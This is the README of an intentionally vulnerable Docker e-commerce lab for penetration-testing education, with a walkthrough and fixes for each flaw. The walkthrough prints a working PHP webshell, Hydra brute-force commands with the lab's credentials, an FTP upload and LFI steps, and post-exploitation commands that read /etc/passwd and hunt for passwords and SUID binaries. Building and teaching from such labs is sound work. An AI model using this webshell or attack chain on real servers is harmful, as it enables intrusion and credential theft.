# 🔒 Vulnerable E-Commerce Lab

![Docker](https://img.shields.io/badge/docker-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white)
![PHP](https://img.shields.io/badge/php-%23777BB4.svg?style=for-the-badge&logo=php&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Security](https://img.shields.io/badge/Security-Educational-red?style=for-the-badge)

> 🎓 **An intentionally vulnerable e-commerce web application for penetration testing education**

A complete penetration testing lab simulating an e-commerce website with multiple classic web vulnerabilities. Perfect for learning offensive and defensive security techniques in a controlled environment.

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Vulnerabilities](#-vulnerabilities)
- [Quick Start](#-quick-start)
- [Walkthrough Solution](#-walkthrough-solution)
- [Defense Recommendations](#-defense-recommendations)
- [Learning Resources](#-learning-resources)
- [Security Warning](#-security-warning)
- [Contributing](#-contributing)
- [License](#-license)

---

## 🎯 Overview

This project simulates a vulnerable e-commerce website designed for penetration testing education. It contains several classic web vulnerabilities that you can exploit in an isolated Docker environment.

### What You'll Learn

- ✅ Reconnaissance and enumeration (Nmap, Gobuster)
- ✅ Brute force attacks (Hydra)
- ✅ FTP service exploitation
- ✅ Webshell creation and upload techniques
- ✅ Local File Inclusion (LFI)
- ✅ Post-exploitation and system enumeration

### Why This Lab?

- 🐳 **100% Dockerized** - One-command installation
- 🔧 **Ready to Use** - No manual configuration needed
- 📚 **Educational** - Complete documentation and detailed walkthrough
- 🎯 **Realistic** - Simulates real-world vulnerabilities
- 🛡️ **Secure** - Complete isolation via Docker

---

## 🚀 Features

### E-Commerce Website
- Modern web interface with product catalog
- Dynamic navigation with GET parameters
- Accessible file system

### FTP Server
- Accessible FTP service with authentication
- File upload enabled
- Misconfigured permissions (intentional)

### Hidden Directories
- `/ftp` - FTP upload directory
- `/wordlist` - Password list (403 but accessible)
- `/users` - User list (403 but accessible)

---

## 🔐 Vulnerabilities

| # | Type | Severity | Description |
|---|------|----------|-------------|
| 1 | **Exposed FTP Service** | 🔴 High | FTP port open without restrictions |
| 2 | **Information Disclosure** | 🟡 Medium | User/password lists publicly accessible |
| 3 | **Weak Authentication** | 🔴 High | Weak and predictable credentials |
| 4 | **Unrestricted File Upload** | 🔴 Critical | PHP file upload without validation |
| 5 | **Local File Inclusion (LFI)** | 🔴 High | Vulnerable `page` parameter |
| 6 | **Remote Code Execution** | 🔴 Critical | PHP execution in uploads directory |
| 7 | **Directory Listing** | 🟢 Low | File listing enabled |

---

## 💻 Quick Start

### Prerequisites

- Docker installed ([Installation Guide](https://docs.docker.com/get-docker/))
- Docker Compose installed
- 2 GB RAM minimum
- 5 GB disk space

### Installation

```bash
# Clone the repository
git clone https://github.com/YOUR_USERNAME/vulnerable-ecommerce-lab.git
cd vulnerable-ecommerce-lab

# Start the lab
docker-compose up -d --build

# Verify it's running
docker ps
```

You should see a container named `vulnerable-ecommerce-lab` running.

### Access

| Service | URL/Command | Port |
|---------|-------------|------|
| **Website** | `http://localhost:8080` | 8080 |
| **FTP** | `ftp localhost 2121` | 2121 |

### Stop the Lab

```bash
# Stop the lab
docker-compose down

# Stop and remove all data
docker-compose down -v
```

---

## 🎓 Walkthrough Solution

> ⚠️ **Spoiler Alert!** This section contains the complete solution. Try solving it yourself first before reading!

<details>
<summary><b>📖 Click here to reveal the complete walkthrough</b></summary>

<br>

## Phase 1: Reconnaissance 🔍

**Objective:** Discover open services and ports

```bash
# Scan the target with Nmap
nmap -sV -sC -p- localhost

# Or scan specific ports:
nmap -sV -sC -p 8080,2121 localhost
```

**Expected output:**
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.65 ((Debian))
2121/tcp open  ftp     vsftpd
```

**What we discovered:**
- ✅ Web server (Apache) on port 8080
- ✅ FTP server (vsftpd) on port 2121

---

## Phase 2: Web Enumeration 🌐

**Objective:** Discover hidden directories and files

```bash
# Enumerate directories with Gobuster
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt

# Alternative using Dirb:
dirb http://localhost:8080 /usr/share/wordlists/dirb/common.txt

# Or with ffuf:
ffuf -u http://localhost:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

**Expected results:**
```
/ftp          [Status: 200]  ✅ Accessible
/wordlist     [Status: 403]  ⚠️ Forbidden
/users        [Status: 403]  ⚠️ Forbidden
```

**Key insight:** The directories return 403 Forbidden, but individual files inside might still be accessible. This is a common misconfiguration!

---

## Phase 3: Information Gathering 📥

**Objective:** Retrieve user and password lists

Even though `/wordlist` and `/users` return 403, let's try accessing files directly:

```bash
# Download the password list
wget http://localhost:8080/wordlist/passwords.txt

# Download the user list
wget http://localhost:8080/users/usernames.txt

# View the contents
cat passwords.txt
cat usernames.txt
```

**Success!** ✅ The files are accessible despite the directory being "protected".

**passwords.txt preview:**
```
password
123456
admin123
welcome
qwerty123
admin
password123
letmein
ftppass
...
```

**usernames.txt preview:**
```
admin
root
ftp
ftpuser
backup
upload
administrator
webmaster
...
```

---

## Phase 4: FTP Brute Force 🔓

**Objective:** Find valid FTP credentials using brute force

```bash
# Brute force attack using Hydra
hydra -L usernames.txt -P passwords.txt ftp://localhost:2121

# If you want verbose output:
hydra -L usernames.txt -P passwords.txt ftp://localhost:2121 -V

# Alternative: Test specific user
hydra -l ftpuser -P passwords.txt ftp://localhost:2121
```

**Expected output:**
```
[2121][ftp] host: localhost   login: ftpuser   password: password123
```

**Credentials found:** ✅ `ftpuser:password123`

---

## Phase 5: FTP Access 📂

**Objective:** Connect to FTP and explore the system

```bash
# Connect to the FTP server
ftp localhost 2121

# Login with discovered credentials
Name: ftpuser
Password: password123

# Once connected, explore:
ftp> pwd
257 "/var/www/html/ftp" is the current directory

ftp> ls -la
# Lists current files in the FTP directory

ftp> help
# Shows available FTP commands
```

---

## Phase 6: Creating the Webshell 🐚

**Objective:** Create a PHP webshell for remote code execution

Before we can upload anything, we need to create our webshell. Here's a simple but effective PHP webshell:

**Create a file named `shell.php` on your local machine:**

```php
<?php
// Simple PHP Web Shell
// Educational purposes only

$output = '';
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Web Shell</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.9);
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
        }
        h1 {
            color: #ff6b6b;
            text-align: center;
            margin-bottom: 10px;
            font-size: 32px;
        }
        .subtitle {
            color: #4ecdc4;
            text-align: center;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .info {
            background: rgba(78, 205, 196, 0.1);
            border-left: 4px solid #4ecdc4;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        .info p {
            color: #4ecdc4;
            margin: 5px 0;
            font-size: 13px;
        }
        input[type="text"] {
            width: calc(100% - 120px);
            padding: 12px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid #4ecdc4;
            border-radius: 5px 0 0 5px;
            color: #fff;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        input[type="text"]:focus {
            outline: none;
            border-color: #ff6b6b;
            background: rgba(255, 255, 255, 0.15);
        }
        button {
            width: 120px;
            padding: 12px;
            background: #ff6b6b;
            border: none;
            border-radius: 0 5px 5px 0;
            color: white;
            cursor: pointer;
            font-weight: bold;
            font-size: 14px;
        }
        button:hover {
            background: #ee5a52;
        }
        .output {
            background: rgba(0, 0, 0, 0.5);
            border: 2px solid #4ecdc4;
            border-radius: 5px;
            padding: 20px;
            min-height: 200px;
            max-height: 500px;
            overflow-y: auto;
            color: #4ecdc4;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-size: 13px;
            line-height: 1.5;
            margin-top: 20px;
        }
        .quick-commands {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin-bottom: 20px;
        }
        .quick-cmd {
            background: rgba(78, 205, 196, 0.2);
            border: 1px solid #4ecdc4;
            padding: 8px 12px;
            border-radius: 5px;
            color: #4ecdc4;
            text-decoration: none;
            text-align: center;
            font-size: 12px;
            transition: all 0.3s;
            display: block;
        }
        .quick-cmd:hover {
            background: rgba(78, 205, 196, 0.3);
            transform: translateY(-2px);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🐚 Web Shell</h1>
        <p class="subtitle">PHP Command Executor</p>
        
        <div class="info">
            <p><strong>📍 Server:</strong> <?php echo gethostname(); ?></p>
            <p><strong>💻 System:</strong> <?php echo php_uname(); ?></p>
            <p><strong>👤 User:</strong> <?php echo get_current_user(); ?> (UID: <?php echo getmyuid(); ?>)</p>
            <p><strong>📂 Directory:</strong> <?php echo getcwd(); ?></p>
            <p><strong>🐘 PHP:</strong> <?php echo phpversion(); ?></p>
        </div>
        
        <div class="quick-commands">
            <a href="?cmd=whoami" class="quick-cmd">whoami</a>
            <a href="?cmd=id" class="quick-cmd">id</a>
            <a href="?cmd=pwd" class="quick-cmd">pwd</a>
            <a href="?cmd=ls -la" class="quick-cmd">ls -la</a>
            <a href="?cmd=uname -a" class="quick-cmd">uname -a</a>
            <a href="?cmd=cat /etc/passwd" class="quick-cmd">cat /etc/passwd</a>
            <a href="?cmd=ps aux" class="quick-cmd">ps aux</a>
            <a href="?cmd=netstat -tulpn" class="quick-cmd">netstat</a>
        </div>
        
        <form method="GET">
            <input type="text" name="cmd" placeholder="Enter your command here..." 
                   value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>" 
                   autofocus>
            <button type="submit">Execute</button>
        </form>
        
        <div class="output">
<?php 
if(!empty($output)) {
    echo htmlspecialchars($output);
} else {
    echo "Waiting for command...\n";
    echo "Use the quick commands above or type your own.";
}
?>
        </div>
    </div>
</body>
</html>
```

**Save this as `shell.php` on your machine.**

---

## Phase 7: File Upload 📤

**Objective:** Upload the webshell via FTP

```bash
# Connect to FTP again
ftp localhost 2121

# Login
Name: ftpuser
Password: password123

# Switch to binary mode (IMPORTANT for PHP files!)
ftp> binary
200 Switching to Binary mode.

# Upload your webshell
ftp> put shell.php
local: shell.php remote: shell.php
200 EPRT command successful.
226 Transfer complete.

# Verify the upload
ftp> ls
shell.php

# Exit FTP
ftp> bye
```

**Success!** ✅ Your webshell is now uploaded to the server.

---

## Phase 8: LFI Exploitation 💥

**Objective:** Access the uploaded webshell using Local File Inclusion

The website has an LFI vulnerability in the `page` parameter. We can exploit it to access our uploaded shell.

**Method 1: Direct Access (recommended)**
```
http://localhost:8080/ftp/shell.php
```

**Method 2: Via LFI vulnerability**
```
http://localhost:8080/index.php?page=ftp/shell
```

**Open either URL in your browser, and you should see your webshell interface!** ✅

---

## Phase 9: Remote Code Execution 🎯

**Objective:** Execute system commands through the webshell

Now that you have access to the webshell, you can execute system commands:

### Basic Information Commands

```bash
# Find out who you are
whoami
# Output: www-data

# Check user ID and groups
id
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Current directory
pwd
# Output: /var/www/html/ftp

# System information
uname -a
# Output: Linux <container-id> 5.x.x ...

# Hostname
hostname
# Output: <docker-container-id>
```

### File System Enumeration

```bash
# List files in current directory
ls -la

# List web root
ls -la /var/www/html

# Find PHP files
find /var/www/html -name "*.php"

# Search for configuration files
find /var/www/html -name "*config*"

# Look for passwords in files
grep -r "password" /var/www/html 2>/dev/null
```

### User Enumeration

```bash
# View all users
cat /etc/passwd

# Find users with login shells
cat /etc/passwd | grep -v nologin | grep -v false

# Current user info
id www-data
```

### Process Information

```bash
# List all processes
ps aux

# Check for interesting processes
ps aux | grep -E "mysql|apache|nginx|ftp"
```

### Network Information

```bash
# Network interfaces
ip a

# Or if ip is not available:
ifconfig

# Network connections
netstat -tulpn

# Or with ss:
ss -tulpn

# Routing table
route -n

# ARP table
arp -a
```

### Privilege Escalation Research

```bash
# Find SUID binaries (potential privilege escalation)
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find writable directories
find / -writable -type d 2>/dev/null | head -20

# Check sudo permissions
sudo -l

# Check for cron jobs
cat /etc/crontab
ls -la /etc/cron.*
```

### Environment Variables

```bash
# Display all environment variables
env

# Check PATH
echo $PATH

# Check if useful tools are available
which python python3 perl ruby gcc
```

### File Download (Exfiltration)

```bash
# If you want to download files from the server:
# Simply navigate to them in the browser:
http://localhost:8080/ftp/shell.php?cmd=cat /etc/passwd
```

---

## Phase 10: Summary 📝

**Exploitation Chain:**

```
1. Nmap Scan
   ↓ Discovered ports 8080 (HTTP) and 2121 (FTP)
   
2. Gobuster Directory Enumeration
   ↓ Found /ftp, /wordlist, /users
   
3. Information Disclosure
   ↓ Downloaded passwords.txt and usernames.txt
   
4. Hydra Brute Force
   ↓ Credentials: ftpuser:password123
   
5. FTP Authentication
   ↓ Successfully logged in to FTP server
   
6. Webshell Creation
   ↓ Created shell.php with command execution
   
7. File Upload
   ↓ Uploaded shell.php via FTP
   
8. LFI Exploitation
   ↓ Accessed shell via /ftp/shell.php
   
9. Remote Code Execution
   ↓ Full command execution as www-data
   
10. Post-Exploitation
    ↓ System enumeration and information gathering
```

**Vulnerabilities Exploited:**
- ✅ Information Disclosure (403 bypass)
- ✅ Weak Authentication (predictable credentials)
- ✅ FTP Misconfiguration (upload enabled)
- ✅ Unrestricted File Upload (no validation)
- ✅ Local File Inclusion (LFI)
- ✅ Remote Code Execution (RCE)

**Congratulations! You've successfully compromised the system!** 🎉

</details>

---

## 🛡️ Defense Recommendations

<details>
<summary><b>How to fix these vulnerabilities</b></summary>

### 1. Secure or Disable FTP Service

```bash
# Best: Use SFTP instead of FTP
apt-get install openssh-server

# If FTP is required:
# - Implement fail2ban for brute force protection
# - Restrict access by IP whitelist
# - Use TLS/SSL (FTPS)
# - Disable anonymous access
# - Use strong password policies
```

### 2. Protect Sensitive Directories

Create `.htaccess` in `/wordlist` and `/users`:

```apache
# Deny all access to this directory and files
<FilesMatch ".*">
    Order Deny,Allow
    Deny from all
</FilesMatch>

# Better: Move these files outside the web root entirely
```

### 3. Implement File Upload Validation

```php
<?php
// Whitelist allowed extensions
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$filename = $_FILES['file']['name'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

// Check extension
if (!in_array($ext, $allowed_extensions)) {
    die('Error: File type not allowed');
}

// Verify MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];

if (!in_array($mime, $allowed_mimes)) {
    die('Error: Invalid file type');
}

// Rename file to prevent execution
$new_name = md5(uniqid(rand(), true)) . '.' . $ext;

// Store outside web root or in non-executable directory
move_uploaded_file($_FILES['file']['tmp_name'], '/uploads/' . $new_name);
?>
```

### 4. Fix Local File Inclusion (LFI)

```php
<?php
// BAD - Vulnerable code:
// include($_GET['page'] . '.php');

// GOOD - Use whitelist:
$allowed_pages = ['home', 'products', 'contact', 'about'];
$page = $_GET['page'] ?? 'home';

// Validate input
if (!in_array($page, $allowed_pages, true)) {
    http_response_code(404);
    $page = '404';
}

// Safe include
include($page . '.php');
?>
```

### 5. Disable PHP Execution in Upload Directory

Create `.htaccess` in `/ftp` directory:

```apache
# Disable PHP execution
<FilesMatch "\.(php|php3|php4|php5|php7|phtml|phar)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>

# Alternative method:
php_flag engine off

# Also add to Apache config:
<Directory "/var/www/html/ftp">
    php_admin_flag engine off
    RemoveHandler .php .phtml .php3
    RemoveType .php .phtml .php3
    AddType text/plain .php .phtml .php3
</Directory>
```

### 6. Implement Security Headers

Add to Apache configuration or `.htaccess`:

```apache
# Security Headers
Header set X-Frame-Options "SAMEORIGIN"
Header set X-XSS-Protection "1; mode=block"
Header set X-Content-Type-Options "nosniff"
Header set Referrer-Policy "strict-origin-when-cross-origin"
Header set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
Header set Permissions-Policy "geolocation=(), microphone=(), camera=()"

# Remove server information
ServerTokens Prod
ServerSignature Off
```

### 7. Input Validation and Sanitization

```php
<?php
// Always validate and sanitize user input
function sanitize_input($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    return $data;
}

// Use prepared statements for database queries
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
?>
```

### 8. Implement Rate Limiting

```bash
# Install fail2ban
apt-get install fail2ban

# Configure for FTP brute force protection
# Create /etc/fail2ban/jail.local:

[vsftpd]
enabled = true
port = ftp,ftp-data,2121
filter = vsftpd
logpath = /var/log/vsftpd.log
maxretry = 3
bantime = 3600
```

### 9. Regular Security Audits

```bash
# Use security scanning tools:
# - OWASP ZAP
# - Nikto
# - Burp Suite
# - Nessus

# Example with Nikto:
nikto -h http://localhost:8080
```

### 10. Web Application Firewall (WAF)

Consider implementing ModSecurity or cloud-based WAF:

```bash
# Install ModSecurity
apt-get install libapache2-mod-security2

# Enable OWASP Core Rule Set
git clone https://github.com/coreruleset/coreruleset /etc/modsecurity/crs
```

</details>

---

## 🔧 Docker Commands

```bash
# Start the lab
docker-compose up -d

# View logs in real-time
docker-compose logs -f

# Stop the lab
docker-compose down

# Restart the lab
docker-compose restart

# Rebuild completely (if you made changes)
docker-compose down
docker-compose up -d --build

# Access container shell (for debugging)
docker exec -it vulnerable-ecommerce-lab bash

# Clean everything (containers, images, volumes)
docker-compose down -v
docker system prune -a
```

---

## 🐛 Troubleshooting

### Website shows 403 Forbidden
```bash
docker-compose down
docker-compose up -d --build
```

### FTP upload fails with "553 Could not create file"
```bash
# Permissions are automatically fixed on container startup
# If issues persist, restart:
docker-compose restart
```

### Port already in use
```bash
# Check which process is using the port
sudo netstat -tulpn | grep -E '8080|2121'
# or
sudo lsof -i :8080
sudo lsof -i :2121

# Option 1: Kill the process
sudo kill -9 <PID>

# Option 2: Change ports in docker-compose.yml
ports:
  - "9090:80"     # Instead of 8080:80
  - "2222:21"     # Instead of 2121:21
```

### Cannot connect to Docker daemon
```bash
# Start Docker service
sudo systemctl start docker

# Add your user to docker group
sudo usermod -aG docker $USER
newgrp docker

# Or run with sudo
sudo docker-compose up -d --build
```

---

## 📚 Learning Resources

### Penetration Testing Platforms
- [**HackTheBox**](https://www.hackthebox.eu/) - Advanced penetration testing challenges
- [**TryHackMe**](https://tryhackme.com/) - Guided labs perfect for beginners
- [**PentesterLab**](https://pentesterlab.com/) - Hands-on web penetration testing exercises
- [**PortSwigger Web Security Academy**](https://portswigger.net/web-security) - Free comprehensive web security training
- [**VulnHub**](https://www.vulnhub.com/) - Vulnerable virtual machines

### Security Knowledge Base
- [**OWASP Top 10**](https://owasp.org/www-project-top-ten/) - Top 10 most critical web application security risks
- [**OWASP Testing Guide**](https://owasp.org/www-project-web-security-testing-guide/) - Comprehensive testing methodology
- [**PayloadsAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings) - Useful payloads and bypass techniques
- [**HackTricks**](https://book.hacktricks.xyz/) - Penetration testing methodology and tricks

### Recommended Tools
- **Nmap** - Network scanner and port discovery
- **Gobuster** / **Dirb** / **Feroxbuster** - Directory and file enumeration
- **Hydra** / **Medusa** - Network login brute force tools
- **Burp Suite** - Web application security testing
- **Metasploit Framework** - Exploitation framework
- **OWASP ZAP** - Web application security scanner
- **SQLMap** - SQL injection exploitation tool
- **Nikto** - Web server scanner

### Certifications
- **CEH** - Certified Ethical Hacker
- **OSCP** - Offensive Security Certified Professional
- **PNPT** - Practical Network Penetration Tester
- **eWPT** - eLearnSecurity Web Application Penetration Tester
- **GPEN** - GIAC Penetration Tester

---

## ⚠️ SECURITY WARNING

```
╔═══════════════════════════════════════════════════════════╗
║       🚨 INTENTIONALLY VULNERABLE ENVIRONMENT 🚨         ║
╠═══════════════════════════════════════════════════════════╣
║                                                            ║
║  ❌ NEVER deploy to production                            ║
║  ❌ NEVER expose to the internet                          ║
║  ❌ NEVER use on shared/public networks                   ║
║  ❌ NEVER use real credentials or data                    ║
║                                                            ║
║  ✅ ALWAYS use in isolated environments only              ║
║  ✅ ALWAYS obtain proper authorization before testing     ║
║  ✅ ALWAYS comply with applicable laws                    ║
║  ✅ ALWAYS use for educational purposes only              ║
║                                                            ║
║  This lab contains CRITICAL vulnerabilities that can      ║
║  completely compromise any system it's deployed on.       ║
║                                                            ║
║  Intended use: EDUCATION and TRAINING only                ║
║                                                            ║
╚═══════════════════════════════════════════════════════════╝
```

### Legal Responsibility

By using this software, you agree to:
- ✅ Use it **only** for educational and training purposes
- ✅ **Not** use it for any illegal activities
- ✅ Obtain necessary **permissions** before conducting any security testing
- ✅ Comply with **cybersecurity laws** in your jurisdiction
- ✅ Accept that the **authors are not responsible** for any misuse or damages

**Unauthorized access to computer systems is illegal in most countries. Always practice ethical hacking.**

---

## 🤝 Contributing

Contributions are welcome! Help make this lab better for everyone.

### How to Contribute

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/awesome-feature`)
3. Make your changes and test thoroughly
4. Commit your changes (`git commit -m '✨ Add awesome feature'`)
5. Push to the branch (`git push origin feature/awesome-feature`)
6. Open a Pull Request

### Contribution Ideas

- 🆕 Add new vulnerabilities (SQLi, XSS, CSRF, XXE, SSRF, IDOR, etc.)
- 🎯 Create CTF-style challenges with hidden flags
- 📚 Improve documentation and add more examples
- 🌍 Add translations to other languages
- 🎨 Enhance the UI/UX of the vulnerable application
- 🔧 Optimize Docker configuration
- 📹 Create video tutorials or walkthroughs
- 🐛 Fix bugs or improve code quality

### Code Style

- Use clear and descriptive variable names
- Comment complex code sections
- Follow PHP PSR standards where applicable
- Test all changes in Docker before submitting

---

## 📄 License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

**Important Note:** This license does NOT authorize you to use this software for malicious, harmful, or illegal purposes. Educational use only.

---

## 🌟 Support the Project

If this project helped you learn:
- ⭐ Give it a star on GitHub
- 🔀 Share it with others who might find it useful
- 🐛 Report bugs or suggest improvements
- 🤝 Contribute new features or fixes

### Questions or Issues?

- 💬 Open an [Issue](https://github.com/YOUR_USERNAME/vulnerable-ecommerce-lab/issues)
- 📖 Check existing documentation
- 🔍 Search closed issues for similar problems

---

## 👨‍💻 Author

Created with 💜 for the cybersecurity education community.

**Purpose:** To provide a safe, legal environment for learning penetration testing techniques.

---

## 🙏 Acknowledgments

Special thanks to:
- The cybersecurity community for sharing knowledge
- OWASP for security guidelines and resources
- Docker team for containerization technology
- All contributors who help improve this lab

---

<div align="center">

**🔒 Hack Legally, Learn Ethically 🔒**

*"The only way to learn security is to practice it in a safe environment."*

Made with 💜 for ethical hackers and security enthusiasts

[⬆ Back to top](#-vulnerable-e-commerce-lab)

</div>
